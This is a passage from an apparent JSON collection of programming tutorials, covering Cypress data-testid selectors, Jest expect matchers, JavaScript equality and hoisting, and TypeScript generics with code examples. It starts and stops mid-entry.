Shipping\n      cy.getByTestId('shipping-form').within(() => {\n        cy.getByTestId('address-input').type('123 Main St');\n        cy.getByTestId('city-input').type('Boston');\n        cy.getByTestId('continue-button').click();\n      });\n      \n      // Step 3: Payment\n      cy.getByTestId('payment-form').within(() => {\n        cy.getByTestId('card-number-input').type('4242424242424242');\n        cy.getByTestId('submit-payment-button').click();\n      });\n      \n      // Confirmation\n      cy.getByTestId('order-confirmation')\n        .should('be.visible')\n        .and('contain', 'Order #');\n    });\n  });\n  ```\n\n- **Assertions and Chaining:**\n  ```javascript\n  // Multiple assertions on same element\n  cy.getByTestId('user-profile')\n    .should('be.visible')\n    .and('contain', 'Alice')\n    .and('have.class', 'active')\n    .and('not.have.class', 'disabled');\n  \n  // Check attributes\n  cy.getByTestId('email-input')\n    .should('have.attr', 'type', 'email')\n    .and('have.attr', 'required');\n  \n  // Check CSS properties\n  cy.getByTestId('success-message')\n    .should('have.css', 'background-color', 'rgb(0, 255, 0)');\n  \n  // Wait for conditions\n  cy.getByTestId('loading-spinner', { timeout: 10000 })\n    .should('not.exist');\n  ```\n\n- **When NOT to Use data-testid:**\n  ```javascript\n  // ✅ Prefer semantic queries when possible\n  \n  // Instead of:\n  cy.getByTestId('heading').should('have.text', 'Welcome');\n  \n  // Use semantic HTML:\n  cy.get('h1').should('have.text', 'Welcome');\n  \n  // Instead of:\n  cy.getByTestId('nav-link-home').click();\n  \n  // Use role/label:\n  cy.get('nav').findByRole('link', { name: 'Home' }).click();\n  \n  // Use data-testid when:\n  // - Element has no semantic meaning\n  // - Multiple similar elements need distinction\n  // - Selector needs to survive refactoring\n  ```\n\n- **Real-World Example (E-commerce):**\n  ```jsx\n  // ProductCard component\n  function ProductCard({ product }) {\n    return (\n      <div data-testid={`product-card-${product.id}`}>\n        <img \n          data-testid={`product-image-${product.id}`}\n          src={product.image} \n        />\n        <h3 data-testid={`product-name-${product.id}`}>\n          {product.name}\n        </h3>\n        <span data-testid={`product-price-${product.id}`}>\n          ${product.price}\n        </span>\n        <button \n          data-testid={`add-to-cart-${product.id}`}\n          onClick={() => addToCart(product)}\n        >\n          Add to Cart\n        </button>\n      </div>\n    );\n  }\n  \n  // Cypress test\n  describe('Product Page', () => {\n    beforeEach(() => {\n      cy.visit('/products');\n    });\n    \n    it('adds product to cart', () => {\n      cy.getByTestId('product-card-123').within(() => {\n        cy.getByTestId('product-name-123')\n          .should('have.text', 'Laptop');\n        cy.getByTestId('product-price-123')\n          .should('contain', '$999');\n        cy.getByTestId('add-to-cart-123').click();\n      });\n      \n      cy.getByTestId('cart-count').should('have.text', '1');\n    });\n    \n    it('filters products by category', () => {\n      cy.getByTestId('category-filter').select('Electronics');\n      cy.get('[data-testid^=\"product-card-\"]')\n        .should('have.length.greaterThan', 0);\n    });\n  });\n  ```\n\n- **Best Practices Summary:**\n  ```\n  ✅ DO:\n  - Use kebab-case for testids\n  - Make testids descriptive and unique\n  - Add testids to interactive elements\n  - Use component-scoped naming (product-card-123)\n  - Remove testids in production builds\n  - Create custom commands (cy.getByTestId)\n  - Combine with Page Object Model\n  \n  ❌ DON'T:\n  - Use generic names (button, div, input)\n  - Add testids to every single element\n  - Rely solely on testids (use semantic HTML too)\n  - Mix camelCase and kebab-case\n  - Include implementation details in names\n  - Forget to update testids when component changes\n  ```"
    },
    {
      "id": "swe/frontend/testing/jest-expect-matchers",
      "title": "Jest Expect Matchers: A Well-Structured Overview",
      "path": [
        "swe",
        "frontend",
        "testing",
        "jest-expect-matchers"
      ],
      "content": "# Jest Expect Matchers: A Well-Structured Overview\n\nJest expect matchers are assertion methods that verify test conditions, providing readable syntax for comparing actual values against expected outcomes with detailed error messages when tests fail.\n\n## Key Points\n\n- **Definition:** Methods chained to `expect()` that perform assertions, validating whether values match expected conditions in unit tests.\n- **Basic Matchers:** `toBe()` (strict equality), `toEqual()` (deep equality), `toBeTruthy()`/`toBeFalsy()` (boolean context).\n- **Negation:** `.not` modifier inverts any matcher—`expect(value).not.toBe(5)`.\n- **Type Checking:** Dedicated matchers for primitives, objects, arrays, null, undefined, and custom types.\n- **Async Support:** Matchers work with promises and async/await using `resolves`/`rejects`.\n- **Error Messages:** Failed assertions provide detailed diffs showing expected vs actual values.\n- **Custom Matchers:** Extend Jest with domain-specific matchers for improved test readability.\n\n## Step-by-Step Explanation & Examples\n\n**Basic Equality Matchers**\n```javascript\ndescribe('Equality Matchers', () => {\n  test('toBe - strict equality (===)', () => {\n    expect(2 + 2).toBe(4);\n    // toBe: Uses Object.is() for comparison\n    // Best for: primitives (numbers, strings, booleans)\n    \n    const obj = { name: 'Alice' };\n    expect(obj).toBe(obj);  // ✓ Same reference\n    \n    expect({ name: 'Alice' }).toBe({ name: 'Alice' });  // ✗ Different references\n  });\n  \n  test('toEqual - deep equality', () => {\n    expect({ name: 'Alice', age: 30 }).toEqual({ name: 'Alice', age: 30 });\n    // toEqual: Recursively compares all properties\n    // Best for: objects, arrays with same structure/values\n    \n    expect([1, 2, 3]).toEqual([1, 2, 3]);  // ✓ Same values\n    expect({ user: { id: 1 } }).toEqual({ user: { id: 1 } });  // ✓ Deep match\n  });\n  \n  test('toStrictEqual - strict deep equality', () => {\n    expect({ name: 'Bob' }).toStrictEqual({ name: 'Bob' });\n    // toStrictEqual: Like toEqual but checks undefined properties and array sparseness\n    \n    expect({ a: undefined }).toEqual({});  // ✓ Passes\n    expect({ a: undefined }).toStrictEqual({});  // ✗ Fails (stricter)\n  });\n});\n```\n\n**Truthiness Matchers**\n```javascript\ndescribe('Truthiness Matchers', () => {\n  test('boolean context checks', () => {\n    expect(true).toBeTruthy();        // Any truthy value\n    expect(1).toBeTruthy();\n    expect('hello').toBeTruthy();\n    expect({}).toBeTruthy();\n    \n    expect(false).toBeFalsy();        // Any falsy value\n    expect(0).toBeFalsy();\n    expect('').toBeFalsy();\n    expect(null).toBeFalsy();\n    \n    expect(null).toBeNull();          // Exactly null\n    expect(undefined).toBeUndefined(); // Exactly undefined\n    expect(value).toBeDefined();      // Not undefined\n  });\n});\n```\n\n**Number Matchers**\n```javascript\ndescribe('Number Matchers', () => {\n  test('numeric comparisons', () => {\n    expect(10).toBeGreaterThan(5);\n    expect(10).toBeGreaterThanOrEqual(10);\n    expect(5).toBeLessThan(10);\n    expect(5).toBeLessThanOrEqual(5);\n    \n    // Floating point comparison (avoids rounding errors)\n    expect(0.1 + 0.2).toBeCloseTo(0.3);  // ✓ Better than toBe(0.3)\n    expect(0.1 + 0.2).toBeCloseTo(0.3, 5);  // 5 decimal places precision\n  });\n});\n```\n\n**String Matchers**\n```javascript\ndescribe('String Matchers', () => {\n  test('string content checks', () => {\n    expect('Hello World').toMatch(/World/);  // Regex match\n    expect('test@example.com').toMatch(/^[\\w.]+@[\\w.]+$/);\n    \n    expect('JavaScript').toContain('Script');  // Substring check\n    \n    expect('Hello').toHaveLength(5);  // String length\n  });\n});\n```\n\n**Array and Object Matchers**\n```javascript\ndescribe('Array and Object Matchers', () => {\n  test('array checks', () => {\n    const fruits = ['apple', 'banana', 'orange'];\n    \n    expect(fruits).toContain('banana');  // Item exists in array\n    expect(fruits).toHaveLength(3);      // Array length\n    \n    expect([1, 2, 3]).toContainEqual(2);  // Deep equality check for item\n    expect([{ id: 1 }, { id: 2 }]).toContainEqual({ id: 1 });\n  });\n  \n  test('object property checks', () => {\n    const user = { name: 'Alice', age: 30, email: 'alice@example.com' };\n    \n    expect(user).toHaveProperty('name');           // Property exists\n    expect(user).toHaveProperty('name', 'Alice');  // Property with value\n    expect(user).toHaveProperty('age', 30);\n    \n    // Nested property path\n    const data = { user: { profile: { city: 'LA' } } };\n    expect(data).toHaveProperty('user.profile.city', 'LA');\n    expect(data).toHaveProperty(['user', 'profile', 'city'], 'LA');\n  });\n  \n  test('partial object matching', () => {\n    const user = { id: 1, name: 'Bob', email: 'bob@test.com', age: 25 };\n    \n    expect(user).toMatchObject({ name: 'Bob', age: 25 });\n    // toMatchObject: Checks if subset of properties match\n    // Ignores extra properties (id, email)\n    \n    const users = [\n      { id: 1, name: 'Alice' },\n      { id: 2, name: 'Bob' }\n    ];\n    expect(users).toEqual(\n      expect.arrayContaining([\n        expect.objectContaining({ name: 'Bob' })\n      ])\n    );\n  });\n});\n```\n\n**Function and Error Matchers**\n```javascript\ndescribe('Function and Error Matchers', () => {\n  test('function throwing errors', () => {\n    const throwError = () => { throw new Error('Failed!'); };\n    \n    expect(throwError).toThrow();                    // Throws any error\n    expect(throwError).toThrow('Failed!');           // Specific message\n    expect(throwError).toThrow(/Failed/);            // Message regex\n    expect(throwError).toThrow(Error);               // Error type\n    \n    // Must wrap in arrow function\n    expect(() => throwError()).toThrow();\n  });\n  \n  test('function call tracking', () => {\n    const mockFn = jest.fn();\n    mockFn('hello', 123);\n    \n    expect(mockFn).toHaveBeenCalled();               // Called at least once\n    expect(mockFn).toHaveBeenCalledTimes(1);         // Exact call count\n    expect(mockFn).toHaveBeenCalledWith('hello', 123); // Specific arguments\n    expect(mockFn).toHaveBeenLastCalledWith('hello', 123); // Last call args\n  });\n});\n```\n\n**Async Matchers**\n```javascript\ndescribe('Async Matchers', () => {\n  test('promise resolution', async () => {\n    const fetchData = () => Promise.resolve('data');\n    \n    // Using async/await\n    await expect(fetchData()).resolves.toBe('data');\n    \n    // Using return\n    return expect(fetchData()).resolves.toBe('data');\n  });\n  \n  test('promise rejection', async () => {\n    const fetchError = () => Promise.reject(new Error('Failed'));\n    \n    await expect(fetchError()).rejects.toThrow('Failed');\n    await expect(fetchError()).rejects.toThrow(Error);\n  });\n});\n```\n\n**Negation with .not**\n```javascript\ndescribe('Negation', () => {\n  test('inverting matchers', () => {\n    expect(5).not.toBe(10);\n    expect('hello').not.toMatch(/world/);\n    expect([1, 2, 3]).not.toContain(4);\n    expect({ name: 'Alice' }).not.toHaveProperty('age');\n    \n    const mockFn = jest.fn();\n    expect(mockFn).not.toHaveBeenCalled();\n  });\n});\n```\n\n## Common Pitfalls\n\n- Using `toBe()` for objects/arrays—compares references, not values. Use `toEqual()` instead.\n- Not wrapping throwing functions in arrow functions—`expect(fn()).toThrow()` executes immediately and fails.\n- Forgetting `await` or `return` with async matchers—tests pass incorrectly without waiting for promises.\n- Using `toContain()` for object arrays—doesn't do deep equality. Use `toContainEqual()`.\n- Comparing floating point numbers with `toBe()`—use `toBeCloseTo()` to avoid rounding errors.\n- Not using `.not` correctly—applies to entire matcher, not just part of chain.\n- Confusing `toHaveLength()` with array contents—only checks length, not values.\n\n## Practical Applications\n\n- **Unit Tests:** Verify function return values, object shapes, and computed results.\n- **Component Testing:** Assert rendered output, prop values, and state changes.\n- **API Testing:** Validate response structure, status codes, and data formats.\n- **Mock Verification:** Ensure functions are called correctly with expected arguments.\n\n## References\n\n- [Jest Expect API](https://jestjs.io/docs/expect)\n- [Jest Matchers Documentation](https://jestjs.io/docs/using-matchers)\n- [Jest Mock Functions](https://jestjs.io/docs/mock-functions)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Custom Matchers:** Extend Jest with domain-specific assertions.\n  ```javascript\n  expect.extend({\n    toBeWithinRange(received, floor, ceiling) {\n      const pass = received >= floor && received <= ceiling;\n      return {\n        pass,\n        message: () => `expected ${received} to be within ${floor}-${ceiling}`\n      };\n    }\n  });\n  expect(100).toBeWithinRange(90, 110);\n  ```\n- **Asymmetric Matchers:** Flexible matching with `expect.anything()`, `expect.any(Type)`, `expect.stringContaining()`.\n  ```javascript\n  expect({ id: expect.any(Number), name: 'Alice' }).toEqual({\n    id: expect.any(Number),\n    name: 'Alice'\n  });\n  ```\n- **Snapshot Testing:** `toMatchSnapshot()` captures component/object output for regression testing.\n- **Inline Snapshots:** `toMatchInlineSnapshot()` writes snapshots directly in test file.\n- **Mock Return Values:** `toHaveReturned()`, `toHaveReturnedWith(value)` for mock function returns.\n- **Type Matchers:** `expect.any(Constructor)` matches any instance of type.\n- **Array Matchers:** `expect.arrayContaining([subset])` for partial array matching.\n- **String Matchers:** `expect.stringContaining(substring)`, `expect.stringMatching(regex)`.\n- **Object Matchers:** `expect.objectContaining(subset)` for partial object matching.\n- **Error Cause:** `toThrow()` supports checking error cause in modern JavaScript.\n- **Soft Assertions:** Use `test.failing()` for expected failures during refactoring.\n- **Concurrent Assertions:** Multiple expects in single test—all must pass.\n- **Custom Error Messages:** Second argument to `expect()` provides custom failure message.\n- **Snapshot Matchers:** `toMatchSnapshot()`, `toThrowErrorMatchingSnapshot()`.\n- **Performance:** Use `toBeGreaterThan()` for execution time assertions."
    },
    {
      "id": "swe/languages/javascript/equality-comparisons-sameness",
      "title": "Equality Comparisons and Sameness in JavaScript",
      "path": [
        "swe",
        "languages",
        "javascript",
        "equality-comparisons-sameness"
      ],
      "content": "# Equality Comparisons and Sameness in JavaScript\n\nJavaScript provides multiple ways to compare values for equality, each with its own rules and quirks. Understanding these is crucial for writing reliable code.\n\n## Types of Equality\n\n### 1. Strict Equality (`===`)\n- Compares both value and type.\n- No type coercion.\n\n```js\n0 === false // false\n'1' === 1   // false\n1 === 1     // true\n```\n\n### 2. Loose Equality (`==`)\n- Compares values after type coercion.\n- Can lead to unexpected results.\n\n```js\n0 == false  // true\n'1' == 1    // true\nnull == undefined // true\n```\n\n### 3. Object Reference Equality\n- Objects and arrays are compared by reference, not by value.\n\n```js\nconst a = [1];\nconst b = [1];\na == b      // false\na === b     // false\nconst c = a;\na === c     // true\n```\n\n## Special Cases and Quirks\n\n- `NaN` is not equal to itself:\n  ```js\n  NaN === NaN // false\n  Object.is(NaN, NaN) // true\n  ```\n- `+0` and `-0` are considered equal by `==` and `===`, but not by `Object.is`:\n  ```js\n  +0 === -0 // true\n  Object.is(+0, -0) // false\n  ```\n- `null` and `undefined` are loosely equal but not strictly equal:\n  ```js\n  null == undefined // true\n  null === undefined // false\n  ```\n\n## Common Mistakes\n\n- Using `==` instead of `===` can cause bugs due to type coercion.\n- Comparing objects or arrays by value (use deep comparison libraries if needed).\n- Forgetting that `NaN !== NaN`.\n\n## Best Practices\n\n- Prefer `===` for most comparisons.\n- Use `Object.is` for edge cases (`NaN`, `+0`, `-0`).\n- For deep equality, use libraries like Lodash's `_.isEqual`.\n\n## Resources\n\n- [MDN: Equality comparisons and sameness](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Equality_comparisons_and_sameness)\n- [MDN: Object.is()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/is)\n-"
    },
    {
      "id": "swe/languages/javascript/generics/generics-constraints",
      "title": "TypeScript Generics with Constraints (`extends`): A Well-Structured Overview",
      "path": [
        "swe",
        "languages",
        "javascript",
        "generics",
        "generics-constraints"
      ],
      "content": "# TypeScript Generics with Constraints (`extends`): A Well-Structured Overview\n\nTypeScript generics with constraints (`extends`) allow you to restrict the types that can be used as generic parameters. This makes your code safer, more expressive, and easier to maintain.\n\n## Key Points\n\n- **Generic Constraints:** Use `extends` to restrict generic types to a specific shape or interface.\n- **Type Safety:** Prevents invalid types from being used, catching errors at compile time.\n- **Versatility:** Constraints work with types, interfaces, and even unions or built-in types.\n- **Property Access:** Enables safe property access and method calls on constrained types.\n- **Reusable Patterns:** Common in utility functions, classes, and advanced type manipulations.\n- **Combining Constraints:** You can use multiple constraints with intersection types (`extends A & B`).\n- **Conditional Types:** Constraints can be combined with conditional types for powerful type logic.\n\n## Step-by-Step Explanation & Examples\n\n1. **Basic Constraint with Interface**\n   ```ts\n   interface HasId {\n     id: number;\n   }\n   function printId<T extends HasId>(obj: T) {\n     console.log(obj.id);\n   }\n   // printId({ id: 123 }); // OK\n   // printId({ name: 'Ada' }); // Error: missing 'id'\n   ```\n\n2. **Constraint with Built-in Types**\n   ```ts\n   function getLength<T extends string | any[]>(input: T): number {\n     return input.length;\n   }\n   // getLength('hello'); // 5\n   // getLength([1, 2, 3]); // 3\n   ```\n\n3. **Constraint with keyof**\n   ```ts\n   function getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {\n     return obj[key];\n   }\n   // getProperty({ name: 'Ada' }, 'name'); // 'Ada'\n   ```\n\n4. **Generic Class with Constraint**\n   ```ts\n   interface Identifiable { id: number; }\n   class Repository<T extends Identifiable> {\n     private items: T[] = [];\n     add(item: T) { this.items.push(item); }\n     findById(id: number): T | undefined {\n       return this.items.find(item => item.id === id);\n     }\n   }\n   ```\n\n5. **Constraint with Intersection Types**\n   ```ts\n   interface A { a: string; }\n   interface B { b: number; }\n   function combine<T extends A & B>(obj: T) {\n     return `${obj.a} - ${obj.b}`;\n   }\n   ```\n\n## Common Pitfalls\n\n- Overly restrictive constraints can limit generic flexibility.\n- Forgetting to constrain generics can lead to unsafe property access.\n- Misusing `keyof` or intersection types can cause confusing errors.\n- Constraints do not enforce runtime checks—only compile-time safety.\n\n## Practical Applications\n\n- Utility functions that operate on objects with specific properties.\n- Type-safe data access and manipulation.\n- Building reusable, type-safe classes and APIs.\n- Advanced type logic in libraries and frameworks.\n\n## References\n\n- [TypeScript Handbook: Generic Constraints](https://www.typescriptlang.org/docs/handbook/2/generics.html#generic-constraints)\n- [TypeScript Deep Dive: Generics](https://basarat.gitbook.io/typescript/type-system/generics)\n- [TypeScript Utility Types](https://www.typescriptlang.org/docs/handbook/utility-types.html)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Conditional Constraints:** Use conditional types to create more dynamic constraints.\n- **Mapped Types:** Combine constraints with mapped types for advanced transformations.\n- **Recursive Constraints:** Constrain generics to recursive types for tree-like structures.\n- **Type Inference:** Use constraints to guide type inference in complex scenarios.\n- **Extending Multiple Types:** Use intersection (`extends A & B`) for multi"
    },
    {
      "id": "swe/languages/javascript/generics/generics_learn",
      "title": "TypeScript Generics — A Pragmatic README",
      "path": [
        "swe",
        "languages",
        "javascript",
        "generics",
        "generics_learn"
      ],
      "content": "# TypeScript Generics — A Pragmatic README\n\n## Difficulty\n\n**Medium**\n\n## Why this matters\n\nGenerics let you write **reusable, type‑safe** code without losing information. You get better autocomplete, fewer casts, and fewer runtime bugs while keeping APIs flexible.\n\n---\n\n## Key concepts\n\n### 1) Generic functions\n\n```ts\nfunction id<T>(value: T): T {\n  return value;\n}\nconst n = id(42);        // T inferred as number\nconst s = id<string>(\"x\"); // explicit type arg (rarely needed)\n```\n\n### 2) Generic interfaces & types\n\n```ts\ntype Box<T> = { value: T };\nconst nBox: Box<number> = { value: 123 };\n```\n\n### 3) Constraints (`extends`)\n\n```ts\nfunction getProp<T extends object, K extends keyof T>(obj: T, key: K): T[K] {\n  return obj[key];\n}\nconst len = getProp({ name: \"Ada\", age: 36 }, \"name\"); // string\n```\n\n### 4) Default type parameters\n\n```ts\ntype ApiResponse<T = unknown> = { ok: boolean; data: T };\nconst r1: ApiResponse = { ok: true, data: null };          // T = unknown\nconst r2: ApiResponse<number> = { ok: true, data: 200 };\n```\n\n### 5) Generic classes\n\n```ts\nclass Cache<K, V> {\n  private m = new Map<K, V>();\n  get(k: K) { return this.m.get(k); }\n  set(k: K, v: V) { this.m.set(k, v); }\n}\n```\n\n### 6) Inference helpers (`infer`)\n\n```ts\ntype UnwrapPromise<T> = T extends Promise<infer U> ? U : T;\ntype A = UnwrapPromise<Promise<number>>; // number\n```\n\n### 7) Distributive conditional types\n\nWhen the checked type is a **naked** type parameter in a conditional, unions distribute:\n\n```ts\ntype Nullable<T> = T | null;\ntype NonNullable<T> = T extends null | undefined ? never : T;\n\ntype X = NonNullable<string | null>; // string (distributes over union)\n```\n\n### 8) Variance & assignability (intuitive take)\n\n* Function **parameters** are effectively *contravariant*.\n* Function **returns** are *covariant*.\n* Collections like `Array<T>` are *covariant* in `T` for reads, but mutation narrows what’s safe:\n\n```ts\nconst numbers: number[] = [1,2];\nconst values: (number | string)[] = numbers; // ❌ would be unsafe if allowed\n```\n\nTypeScript protects you here via assignability rules.\n\n### 9) Narrowing with generic APIs\n\nUse constraints and overloads to preserve info:\n\n```ts\nfunction first<T extends readonly unknown[]>(xs: T): T[number] | undefined;\nfunction first<T>(xs: readonly T[]): T | undefined;\nfunction first(xs: readonly unknown[]) { return xs[0]; }\n\nconst t = first([1, \"x\"] as const); // 1 | \"x\"\n```\n\n### 10) Utility types use generics\n\n* `Partial<T>`, `Required<T>`, `Readonly<T>`, `Record<K, T>`, `Pick<T, K>`, `Omit<T, K>`\n* `ReturnType<F>`, `Parameters<F>`, `InstanceType<C>`\n* These are great examples of generics + conditionals + `keyof`.\n\n---\n\n## Quick patterns you’ll use a lot\n\n### Map in, map out (preserve shape)\n\n```ts\nfunction mapValues<T extends object, R>(\n  obj: T,\n  fn: (value: T[keyof T], key: keyof T) => R\n): { [K in keyof T]: R } {\n  const out = {} as { [K in keyof T]: R };\n  for (const k in obj) out[k] = fn(obj[k], k);\n  return out;\n}\n```\n\n### Typed event bus\n\n```ts\ntype Events = {\n  login: { userId: string };\n  logout: void;\n};\nclass Emitter<E extends Record<string, any>> {\n  private handlers: { [K in keyof E]?: Array<(p: E[K]) => void> } = {};\n  on<K extends keyof E>(type: K, h: (p: E[K]) => void) {\n    (this.handlers[type] ??= []).push(h);\n  }\n  emit<K extends keyof E>(type: K, payload: E[K]) {\n    this.handlers[type]?.forEach(h => h(payload));\n  }\n}\nconst bus = new Emitter<Events>();\nbus.on(\"login\", p => p.userId); // payload is typed\n```\n\n### Branded primitives\n\n```ts\ntype Brand<T, B extends string> = T & { readonly __brand: B };\ntype UserId = Brand<string, \"UserId\">;\n\nfunction getUser(id: UserId) { /* ... */ }\n// getUser(\"abc\") ❌\n// getUser(\"abc\" as UserId) ✅\n```\n\n---\n\n## Pitfalls\n\n* **JSX angle‑bracket clash:**\n  In `.tsx`, `<T>(x: T) => x` can be parsed as JSX. Use a comma to disambiguate:\n\n  ```ts\n  const id = <T,>(x: T) => x; // note the comma\n  ```\n\n* **No runtime generics:**\n  Types are erased. You can’t do `if (T === string)`. Pass *values* when you need runtime behavior (e.g., a parser) or use tagged unions.\n\n* **Over‑constraining:**\n  `T extends string` blocks numbers even when your code doesn’t require it. Prefer `unknown` + narrowing inside the function.\n\n* **Accidentally widening:**\n  `const x = []` is `any[]` under `noImplicitAny: false`. Use `as const`, explicit generics, or initial elements to guide inference.\n\n* **Distributive conditionals surprises:**\n  `T extends U ? X : Y` distributes over `T = A | B`. If you want **non‑distributive**, wrap `T`:\n\n  ```ts\n  type NonDist<T> = [T] extends [U] ? X : Y;\n  ```\n\n* **Inferring the wrong thing from arrays/tuples:**\n  `T[number]` turns a tuple into a union of its element types. Use `as const` to preserve literal types.\n\n* **Generic type args on callbacks:**\n  You can’t write `arr.map<T>(...)` for inference on inline callbacks. Extract helper functions or annotate parameters.\n\n* **`any` vs `unknown`:**\n  `any` opts out of type safety and spreads. `unknown` forces you to narrow—prefer it for safe generics.\n\n---\n\n## Cheat sheet\n\n* Prefer **inference** over explicit `<T>` arguments.\n* Start with `T extends unknown` (or just `T`) and **add constraints only when needed**.\n* Use **default type params** to keep public APIs ergonomic.\n* For APIs transforming shapes, use **mapped types**: `{ [K in keyof T]: ... }`.\n* Reach for **utility types** (`Pick`, `Omit`, `Record`) before writing your own.\n* When a conditional type is “doing too much,” make it **non‑distributive** with `[T]`.\n\n---\n\n## Minimal practice (5 minutes)\n\n1. Write `pluck<T, K extends keyof T>(arr: T[], key: K): Array<T[K]>`.\n2. Create `DeepReadonly<T>` that recursively readonly‑ifies objects and arrays.\n3. Implement `TupleToObject<T extends readonly string[]>` that maps each string to `true`.\n\n---\n\n## Further reading\n\n* *TypeScript Handbook*: “Generics”, “Keyof”, “Mapped Types”, “Conditional Types”\n* *Effective TypeScript* (Dan Vanderkam): Items on generics & type design\n* Type-level patterns by community libraries (e.g., how `@types/react` models props)\n* Utility types in `lib.es5.d.ts`—read the source to see real‑world generic techniques\n\n---\n\n## FAQ\n\n**Q: When should I use overloads vs generics?**\nUse **generics** when one implementation works for many types. Use **overloads** when you need different **call‑site** signatures (e.g., different return types based on argument shapes).\n\n**Q: How do I expose a “fluent” API without losing types?**\nCarry the generic through the chain and use `this` types or return new generic types at each step (builders often use mapped types + `as const`).\n\n**Q: Are generics slower?**\nNo—erased at runtime. They can **speed you up** by catching bugs at compile time.\n\n---\n\n## Example: typed fetch helper\n\n```ts\n// Define your API responses centrally\ninterface Endpoints {\n  \"/users/:id\": { params: { id: string }; response: { id: string; name: string } };\n  \"/posts\":    { params: void;           response: { id: string; title: string }[] };\n}\n\ntype PathParams<P> = P extends { params: infer R } ? R : void;\ntype PathResp<P>   = P extends { response: infer R } ? R : never;\n\nasync function api<K extends keyof Endpoints>(\n  path: K,\n  params: PathParams<Endpoints[K]>\n): Promise<PathResp<Endpoints[K]>> {\n  // (Pretend) build URL with params, call fetch, parse json...\n  return {} as any;\n}\n\nconst user = await api(\"/users/:id\", { id: \"42\" }); // typed { id: string; name: string }\nconst posts = await api(\"/posts\", undefined);       // typed array of posts\n```\n"
    },
    {
      "id": "swe/languages/javascript/hoisting-js",
      "title": "JavaScript Hoisting: Complete Overview",
      "path": [
        "swe",
        "languages",
        "javascript",
        "hoisting-js"
      ],
      "content": "# JavaScript Hoisting: Complete Overview\n\nHoisting is JavaScript's behavior of moving variable and function declarations to the top of their scope during compilation, before code execution. This means you can reference variables and functions before they appear in the code, though the behavior differs between `var`, `let`, `const`, and function declarations. Think of it like JavaScript reading through your entire script first, making note of all declarations, then executing—it \"knows about\" things before it reaches them.\n\n## Key Points\n\n- **What Happens:** Declarations move to top of scope, assignments stay in place\n- **var:** Hoisted and initialized to `undefined`\n- **let/const:** Hoisted but not initialized (Temporal Dead Zone)\n- **Functions:** Fully hoisted (declaration + definition)\n- **Not Magic:** Happens during compilation phase, not runtime\n\n## Basic Examples\n\n### var Hoisting\n\n```javascript\n// What you write\nconsole.log(x);  // undefined (not error!)\nvar x = 5;\nconsole.log(x);  // 5\n\n// How JavaScript interprets it (conceptually)\nvar x;           // Declaration hoisted\nconsole.log(x);  // undefined\nx = 5;           // Assignment stays in place\nconsole.log(x);  // 5\n```\n\n### let/const Hoisting (Temporal Dead Zone)\n\n```javascript\n// What you write\nconsole.log(y);  // ❌ ReferenceError: Cannot access 'y' before initialization\nlet y = 10;\n\n// How it works\n// let y is hoisted, but NOT initialized\n// Accessing it before declaration = Temporal Dead Zone (TDZ)\nlet y;           // Declaration hoisted but in TDZ\nconsole.log(y);  // ❌ Error - still in TDZ\ny = 10;          // Now initialized\n\n// Same for const\nconsole.log(z);  // ❌ ReferenceError\nconst z = 20;\n```\n\n### Function Hoisting\n\n```javascript\n// Function declarations are fully hoisted\ngreet();  // ✅ \"Hello!\" (works before declaration)\n\nfunction greet() {\n  console.log(\"Hello!\");\n}\n\n// Function expressions are NOT fully hoisted\nsayHi();  // ❌ TypeError: sayHi is not a function\n\nvar sayHi = function() {\n  console.log(\"Hi!\");\n};\n\n// Interpreted as:\nvar sayHi;           // Variable hoisted (undefined)\nsayHi();             // ❌ undefined() - not a function yet\nsayHi = function() { // Assignment happens here\n  console.log(\"Hi!\");\n};\n```\n\n## Hoisting by Declaration Type\n\n### var (Hoisted + Initialized to undefined)\n\n```javascript\nconsole.log(a);  // undefined\nvar a = 1;\nconsole.log(a);  // 1\n\n// Hoisting in loops\nconsole.log(i);  // undefined\nfor (var i = 0; i < 3; i++) {\n  // i is hoisted to function/global scope\n}\nconsole.log(i);  // 3 (still accessible!)\n\n// Hoisting in functions\nfunction test() {\n  console.log(x);  // undefined\n  var x = 10;\n  console.log(x);  // 10\n}\n```\n\n### let (Hoisted but TDZ)\n\n```javascript\nconsole.log(b);  // ❌ ReferenceError\nlet b = 2;\n\n// Block scoped - not hoisted out of block\n{\n  console.log(c);  // ❌ ReferenceError\n  let c = 3;\n}\n// console.log(c);  // ❌ ReferenceError: c is not defined\n\n// Loops - block scoped\nfor (let i = 0; i < 3; i++) {\n  // i is scoped to this block\n}\n// console.log(i);  // ❌ ReferenceError: i is not defined\n```\n\n### const (Same as let, but must initialize)\n\n```javascript\nconsole.log(d);  // ❌ ReferenceError\nconst d = 4;\n\n// Must initialize when declared\nconst e;  // ❌ SyntaxError: Missing initializer\ne = 5;\n\n// Also block scoped with TDZ\n{\n  const f = 6;\n}\n// console.log(f);  // ❌ ReferenceError\n```\n\n### Function Declarations (Fully Hoisted)\n\n```javascript\n// ✅ Works - function fully hoisted\ndoSomething();\n\nfunction doSomething() {\n  console.log(\"Doing something\");\n}\n\n// Functions hoist above variables\nconsole.log(typeof myFunc);  // \"function\"\nconsole.log(typeof myVar);   // \"undefined\"\n\nfunction myFunc() {}\nvar myVar = 1;\n```\n\n### Function Expressions (Not Fully Hoisted)\n\n```javascript\n// ❌ TypeError: notHoisted is not a function\nnotHoisted();\n\nvar notHoisted = function() {\n  console.log(\"Won't work\");\n};\n\n// With let/const\nalsoNotHoisted();  // ❌ ReferenceError\n\nconst alsoNotHoisted = function() {\n  console.log(\"Still won't work\");\n};\n\n// Arrow functions same as function expressions\narrowFunc();  // ❌ ReferenceError\n\nconst arrowFunc = () => console.log(\"Nope\");\n```\n\n## Scope and Hoisting\n\n### Function Scope (var)\n\n```javascript\nfunction example() {\n  console.log(x);  // undefined (hoisted to function top)\n  \n  if (true) {\n    var x = 10;\n  }\n  \n  console.log(x);  // 10\n}\n\n// Interpreted as:\nfunction example() {\n  var x;           // Hoisted to function scope\n  console.log(x);  // undefined\n  \n  if (true) {\n    x = 10;        // Assignment\n  }\n  \n  console.log(x);  // 10\n}\n```\n\n### Block Scope (let/const)\n\n```javascript\nfunction example() {\n  console.log(y);  // ❌ ReferenceError (TDZ)\n  \n  if (true) {\n    let y = 20;    // Block scoped\n    console.log(y);  // 20\n  }\n  \n  console.log(y);  // ❌ ReferenceError (not in scope)\n}\n\n// 